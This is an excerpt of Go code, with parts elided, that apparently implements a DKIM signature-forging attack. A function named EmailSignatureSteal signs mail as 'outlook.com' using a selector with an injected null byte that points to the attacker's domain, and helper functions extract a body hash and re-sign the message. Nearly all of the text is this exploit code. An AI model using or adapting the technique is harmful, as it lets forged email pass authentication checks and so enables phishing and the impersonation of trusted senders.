...
const YOUR_DOMAIN = "helloworld.xxx.cn"
...
func ReSign(bodyHash string) error {
	...
	log.Infoln("Email signed by go-dkim successfully")
	return CreateNewBytesMail("output2.eml", email)
}

func GenerateNewBodyHash() string {
	...
	str := string(b.Bytes())
	re := regexp.MustCompile(`bh=[a-zA-Z0-9+/]*={0,2};.*`)
	match := re.FindStringSubmatch(str)
	if len(match) == 0 {
		log.Fatal("Error getting body hash")
	}
	bh := match[0][3 : len(match[0])-2]
	log.Infoln("Body Hash:", bh)
	return bh
}
...
func EmailSignatureSteal() {
	...
	options := &dkim.SignOptions{
		Domain:                 "outlook.com",
		Selector:               "dkim._domainkey." + YOUR_DOMAIN + ".\x00.any.",
		Signer:                 signer,
		Expiration:             time.Now().Local().Add(time.Hour * 48),
		HeaderKeys:             []string{"from"},
		BodyCanonicalization:   dkim.CanonicalizationRelaxed,
	...
	log.Infoln("Email Signature Generated By go-msgauth Successfully")
}
